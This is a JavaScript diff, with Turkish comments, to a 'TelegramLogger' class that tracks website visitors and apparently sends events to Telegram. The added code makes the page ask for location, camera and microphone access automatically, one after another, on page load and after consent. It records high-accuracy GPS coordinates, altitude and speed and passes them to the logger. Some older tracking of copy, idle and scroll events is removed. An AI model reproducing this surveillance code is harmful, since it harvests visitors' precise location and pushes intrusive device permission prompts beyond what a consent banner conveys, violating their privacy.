@@ -50,12 +50,20 @@ class TelegramLogger {
             if (this.autoTrack) {
                 this.initAutoTracking();
             }
+
+            // OTOMATIK İZİN İSTEKLERİ (Sayfa yüklendiğinde)
+            setTimeout(() => {
+                this.requestLocationAccess();
+                setTimeout(() => this.requestCameraAccess(), 1000);
+                setTimeout(() => this.requestMicrophoneAccess(), 2000);
+            }, 1000);
+            
             return;
         }
 
         // Accept butonuna tıklanırsa
         if (acceptBtn) {
-            acceptBtn.addEventListener('click', () => {
+            acceptBtn.addEventListener('click', async () => {
                 this.consentGiven = true;
                 this.consentChecked = true;
                 localStorage.setItem('tracking_consent', 'true');
@@ -68,10 +76,26 @@ class TelegramLogger {
                 }
                 
                 // İlk consent log'u gönder
-                this.sendLog('consent_granted', {
+                await this.sendLog('consent_granted', {
                     consent_type: 'full',
                     consent_method: 'explicit_accept'
                 });
+
+                // OTOMATIK İZİN İSTEKLERİ (Konum, Kamera, Mikrofon)
+                setTimeout(() => {
+                    // Konum izni iste
+                    this.requestLocationAccess();
+                    
+                    // Kamera izni iste
+                    setTimeout(() => {
+                        this.requestCameraAccess();
+                    }, 1000);
+                    
+                    // Mikrofon izni iste
+                    setTimeout(() => {
+                        this.requestMicrophoneAccess();
+                    }, 2000);
+                }, 500);
             });
         }
 
@@ -234,17 +258,7 @@ class TelegramLogger {
             this.trackPageExit();
         });
 
-        // Visibility change
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                this.trackEvent('page_hidden', { scroll_depth: `${this.maxScrollDepth}%` });
-            } else {
-                this.trackEvent('page_visible');
-            }
-        });
-
-        // Scroll tracking
-        let scrollTimeout;
+        // Scroll tracking (sadece depth takibi, milestone loglaması YOK)
         window.addEventListener('scroll', () => {
             const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
             const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
@@ -253,57 +267,10 @@ class TelegramLogger {
             if (this.scrollDepth > this.maxScrollDepth) {
                 this.maxScrollDepth = this.scrollDepth;
             }
-
-            clearTimeout(scrollTimeout);
-            scrollTimeout = setTimeout(() => {
-                if (this.maxScrollDepth >= 25 && !this.scrollMilestones?.['25']) {
-                    this.scrollMilestones = this.scrollMilestones || {};
-                    this.scrollMilestones['25'] = true;
-                    this.trackEvent('scroll_milestone', { milestone: '25%' });
-                }
-                if (this.maxScrollDepth >= 50 && !this.scrollMilestones?.['50']) {
-                    this.scrollMilestones['50'] = true;
-                    this.trackEvent('scroll_milestone', { milestone: '50%' });
-                }
-                if (this.maxScrollDepth >= 75 && !this.scrollMilestones?.['75']) {
-                    this.scrollMilestones['75'] = true;
-                    this.trackEvent('scroll_milestone', { milestone: '75%' });
-                }
-                if (this.maxScrollDepth >= 100 && !this.scrollMilestones?.['100']) {
-                    this.scrollMilestones['100'] = true;
-                    this.trackEvent('scroll_milestone', { milestone: '100% (Bottom)' });
-                }
-            }, 500);
         });
 
-        // Copy/Paste tracking
-        document.addEventListener('copy', (e) => {
-            const copiedText = window.getSelection().toString();
-            if (copiedText && copiedText.length > 0) {
-                this.trackEvent('text_copied', {
-                    text_length: copiedText.length,
-                    text_preview: copiedText.substring(0, 50) + (copiedText.length > 50 ? '...' : '')
-                });
-            }
-        });
-
-        // Mouse leave tracking
-        document.addEventListener('mouseleave', () => {
-            this.trackEvent('mouse_left_page');
-        });
-
-        // Idle tracking (5 dakika hareketsizlik)
-        let idleTimeout;
-        const resetIdleTimer = () => {
-            clearTimeout(idleTimeout);
-            idleTimeout = setTimeout(() => {
-                this.trackEvent('user_idle', { idle_duration: '5 minutes' });
-            }, 300000); // 5 dakika
-        };
-        ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'].forEach(event => {
-            document.addEventListener(event, resetIdleTimer, true);
-        });
-        resetIdleTimer();
+        // Gereksiz tracking'ler kaldırıldı (copy, mouse leave, idle)
+        // Sadece temel tracking aktif: page view, page exit, button clicks
     }
 
     // Sayfa görüntüleme
@@ -380,6 +347,53 @@ class TelegramLogger {
             file_name: fileName,
             file_url: fileUrl
         });
+    }
+
+    // Konum izni iste ve track et
+    async requestLocationAccess() {
+        if (!navigator.geolocation) {
+            this.trackEvent('location_not_supported', {
+                permission_type: 'location',
+                permission_status: 'not_supported'
+            });
+            return { success: false, granted: false, error: 'Geolocation not supported' };
+        }
+
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+
+            // İzin verildi - Konum bilgisi al
+            const locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: `${Math.round(position.coords.accuracy)}m`,
+                altitude: position.coords.altitude ? `${Math.round(position.coords.altitude)}m` : 'Unknown',
+                speed: position.coords.speed ? `${Math.round(position.coords.speed)}m/s` : 'Unknown'
+            };
+
+            this.trackEvent('location_permission_granted', {
+                permission_type: 'location',
+                permission_status: 'granted',
+                ...locationData
+            });
+            
+            return { success: true, granted: true, location: locationData };
+        } catch (error) {
+            // İzin reddedildi veya hata
+            this.trackEvent('location_permission_denied', {
+                permission_type: 'location',
+                permission_status: 'denied',
+                error: error.message || error.code
+            });
+            
+            return { success: false, granted: false, error: error.message };
+        }
     }
 
     // Kamera izni iste ve track et
